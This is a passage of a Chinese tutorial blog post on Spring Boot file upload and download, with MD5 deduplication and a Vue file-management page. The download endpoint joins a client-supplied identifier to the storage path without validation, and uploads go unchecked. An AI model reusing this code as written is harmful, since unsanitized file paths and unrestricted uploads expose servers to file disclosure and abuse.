java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/file\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FileController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;files.upload.path&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 将文件的路径传入进来接口</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> fileUploadPath<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token annotation punctuation\">@Resource</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">FileMapper</span> fileMapper<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/upload\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span> <span class=\"token class-name\">MultipartFile</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">String</span> originalFilename <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getOriginalFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">String</span> type <span class=\"token operator\">=</span> <span class=\"token class-name\">FileUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">extName</span><span class=\"token punctuation\">(</span>originalFilename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">long</span> size <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getSize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// 先存储到磁盘</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">File</span> uploadParentFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>fileUploadPath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\">// 判断配置的文件目录是否存在，若不存在则创建一个新的文件目录</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>uploadParentFile<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            uploadParentFile<span class=\"token punctuation\">.</span><span class=\"token function\">mkdirs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 定义一个文件唯一的标识码</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">String</span> uuid <span class=\"token operator\">=</span> <span class=\"token class-name\">IdUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">fastSimpleUUID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token class-name\">File</span> uploadFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>fileUploadPath <span class=\"token operator\">+</span> uuid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\">// 把获取到的文件存储到磁盘目录</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        file<span class=\"token punctuation\">.</span><span class=\"token function\">transferTo</span><span class=\"token punctuation\">(</span>uploadFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 存储数据库</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中新建了 FileMapper.java 类</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121183537276.png\" alt=\"image-20240121183537276\" /></p>\n<p>拦截器 excludePathPatterns 放开</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121184300888.png\" alt=\"image-20240121184300888\" /></p>\n<p>postman 测试接口</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121183525497.png\" alt=\"image-20240121183525497\" /></p>\n<p>保存的文件，这里需要拼接好路径获取正确的文件名</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121184340613.png\" alt=\"image-20240121184340613\" /></p>\n<p>新建<strong> Files.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>entity</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IdType</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TableId</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TableName</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">lombok<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Data</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token annotation punctuation\">@Data</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token annotation punctuation\">@TableName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sys_file\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Files</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token annotation punctuation\">@TableId</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> <span class=\"token class-name\">IdType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">AUTO</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Integer</span> id<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Long</span> size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> md5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Boolean</span> isDelete<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Boolean</span> enable<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121185032356.png\" alt=\"image-20240121185032356\" /></p>\n<p>再在 FileController.java 中写 Download 文件下载接口</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * 文件下载接口   http://localhost:9090/file/&#123;fileUuid&#125;;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @param fileUuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param response</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @throws IOException</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/&#123;fileUuid&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">downLoad</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@PathVariable</span> <span class=\"token class-name\">String</span> fileUuid<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 根据文件的唯一标识码获取文件</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token class-name\">File</span> uploadFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>fileUploadPath <span class=\"token operator\">+</span> fileUuid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 设置输出流的格式</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token class-name\">ServletOutputStream</span> os <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    response<span class=\"token punctuation\">.</span><span class=\"token function\">addHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Disposition\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"attachment;filename=\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">URLEncoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>fileUuid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/octet-stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 读取文件的字节流</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    os<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FileUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">readBytes</span><span class=\"token punctuation\">(</span>uploadFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    os<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    os<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成功返回路径，浏览器访问地址可以下载</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121204346553.png\" alt=\"image-20240121204346553\" /></p>\n<p>数据库也有对应数据</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121204627417.png\" alt=\"image-20240121204627417\" /></p>\n<p>新增数据库 MD5 字段，Files.java 实体类也要加上 md5 属性</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121205612286.png\" alt=\"image-20240121205612286\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121205737822.png\" alt=\"image-20240121205737822\" /></p>\n<p>为了<strong>防止存入相同的文件</strong>，设置了 MD5 鉴别是否已经有了相同的记录，若没有相同记录，需要后续的存入操作，若有相同记录，直接返回之前的包含 uuid 的 URL 即可</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/upload\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span> <span class=\"token class-name\">MultipartFile</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">String</span> originalFilename <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getOriginalFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">String</span> type <span class=\"token operator\">=</span> <span class=\"token class-name\">FileUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">extName</span><span class=\"token punctuation\">(</span>originalFilename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">long</span> size <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getSize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 定义一个文件唯一的标识码</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">String</span> fileUuid <span class=\"token operator\">=</span> <span class=\"token class-name\">IdUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">fastSimpleUUID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token constant\">DOT</span> <span class=\"token operator\">+</span> type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 拼接组合文件名</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token class-name\">File</span> uploadFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>fileUploadPath <span class=\"token operator\">+</span> fileUuid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 判断配置的文件目录是否存在，若不存在则创建一个新的文件目录</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token class-name\">File</span> parentFile <span class=\"token operator\">=</span> uploadFile<span class=\"token punctuation\">.</span><span class=\"token function\">getParentFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>parentFile<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        parentFile<span class=\"token punctuation\">.</span><span class=\"token function\">mkdirs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">// 获取文件的 md5, 使文件具有唯一性，每次上传都会判断是否有相同的 md5 值</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token class-name\">String</span> md5 <span class=\"token operator\">=</span> <span class=\"token class-name\">SecureUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 从数据库查询是否存在相同的记录</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token class-name\">Files</span> dbFiles <span class=\"token operator\">=</span> <span class=\"token function\">getFileByMd5</span><span class=\"token punctuation\">(</span>md5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dbFiles <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        url <span class=\"token operator\">=</span> dbFiles<span class=\"token punctuation\">.</span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// 把获取到的文件存储到磁盘目录</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        file<span class=\"token punctuation\">.</span><span class=\"token function\">transferTo</span><span class=\"token punctuation\">(</span>uploadFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// 数据库若不存在重复文件，则不删除刚才上传的文件</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:9090/file/\"</span> <span class=\"token operator\">+</span> fileUuid<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token comment\">// 存储数据库</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token class-name\">Files</span> saveFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        saveFile<span class=\"token punctuation\">.</span><span class=\"token function\">setName</span><span class=\"token punctuation\">(</span>originalFilename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        saveFile<span class=\"token punctuation\">.</span><span class=\"token function\">setType</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        saveFile<span class=\"token punctuation\">.</span><span class=\"token function\">setSize</span><span class=\"token punctuation\">(</span>size<span class=\"token operator\">/</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 单位 kb</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        saveFile<span class=\"token punctuation\">.</span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        saveFile<span class=\"token punctuation\">.</span><span class=\"token function\">setMd5</span><span class=\"token punctuation\">(</span>md5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        fileMapper<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>saveFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 存储</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">return</span> url<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"前端\"><a class=\"anchor\" href=\"#前端\">#</a> 前端</h2>\n<p>File.vue</p>\n<pre><code class=\"language-vue\">&lt;script&gt;\nexport default &#123;\n  name: &quot;File&quot;,\n  data()&#123;\n    return&#123;\n      tableData: [],\n      name:'',\n      multipleSelection:[],\n      pageNum:1,\n      pageSize:10,\n      total:0\n    &#125;\n  &#125;,\n  created() &#123;\n    //重新请求加载数据\n    this.load()\n  &#125;,\n  methods: &#123;\n    load() &#123;\n      this.request.get(&quot;/file/page&quot;, &#123;\n        params: &#123;\n          pageNum: this.pageNum,\n          pageSize: this.pageSize,\n          name: this.name,\n        &#125;\n      &#125;).then(res =&gt; &#123;\n        console.log(res)\n        this.tableData = res.data.records\n        this.total = res.data.total\n      &#125;)\n    &#125;,\n    reset() &#123;\n      this.username = &quot;&quot;\n      this.email = &quot;&quot;\n      this.address = &quot;&quot;\n    &#125;,\n    handleDelete(id)&#123;//删除按钮\n      this.request.delete(&quot;/file/&quot;+id).then(res =&gt;&#123;\n        if (res.data === '200')&#123;\n          this.$message.error(&quot;删除失败&quot;)\n        &#125;else&#123;\n          this.$message.success(&quot;删除成功&quot;)\n          this.load()\n        &#125;\n      &#125;)\n    &#125;,\n    handleSelectionChange(val) &#123;\n      console.log(val)\n      this.multipleSelection = val;\n    &#125;,\n    deleteBatch()&#123;\n      let ids = this.multipleSelection.map(v =&gt; v.id) //将一个个的对象数组变成[1，2，3]\n      this.request.post(&quot;/file/del/batch&quot;,ids).then(res =&gt;&#123;\n        if (res.data === '200')&#123;\n          this.$message.error(&quot;批量删除失败&quot;)\n\n        &#125;else&#123;\n          this.$message.success(&quot;批量删除成功&quot;)\n          this.load()\n        &#125;\n      &#125;)\n    &#125;,\n    handleSizeChange(pageSize) &#123;\n      console.log(pageSize);\n      this.pageSize = pageSize\n      //用更新后的数据再请求\n      this.load()\n    &#125;,\n    handleCurrentChange(pageNum) &#123;\n      console.log(pageNum);\n      this.pageNum = pageNum\n      //用更新后的数据再请求\n      this.load()\n    &#125;,\n    handleFileUploadSuccess(res)&#123;\n      this.$message.success(&quot;上传成功&quot;)\n      this.load()\n      console.log(res)\n    &#125;,\n    download(url)&#123;\n      window.open(url)\n    &#125;,\n    changeEnable(row)&#123;\n      this.request.post(&quot;/file/update&quot;,row).then(res =&gt;&#123;\n        if (res.code === '200')&#123;\n          this.$message.success(&quot;操作成功&quot;)\n        &#125;\n      &#125;)\n    &#125;,\n\n  &#125;\n&#125;\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div&gt;\n    &lt;div style=&quot;padding: 10px 0 &quot;&gt;\n      &lt;el-input style=&quot;width: 200px&quot; placeholder=&quot;请输入名称&quot; suffix-icon=&quot;el-icon-search&quot; v-model=&quot;name&quot;&gt;&lt;/el-input&gt;\n      &lt;el-button class = &quot;ml-5&quot; type=&quot;primary&quot; @click=&quot;load&quot;&gt;搜索&lt;/el-button&gt;\n      &lt;el-button type=&quot;warning&quot; @click=&quot;reset&quot; &gt;重置&lt;/el-button&gt;\n    &lt;/div&gt;\n\n    &lt;div style=&quot;margin: 10px 0 &quot;&gt;\n      &lt;el-upload action=&quot;http://localhost:9090/file/upload&quot; :show-file-list=&quot;false&quot;  :on-success=&quot;handleFileUploadSuccess&quot; style=&quot;display: inline-block&quot;&gt;\n        &lt;el-button type=&quot;primary&quot; class=&quot;ml-5&quot;&gt;上传文件&lt;i class=&quot;el-icon-top&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n      &lt;/el-upload&gt;\n      &lt;!--                一个添加气泡对话框--&gt;\n      &lt;el-popconfirm\n          class=&quot;ml-5&quot;\n          confirm-button-text='确定'\n          cancel-button-text='我再想想'\n          icon=&quot;el-icon-info&quot;\n          icon-color=&quot;red&quot;\n          title=&quot;您确定删除吗？&quot; @confirm=&quot;deleteBatch&quot;\n      &gt;\n        &lt;el-button type=&quot;danger&quot; slot=&quot;reference&quot;&gt;批量删除 &lt;i 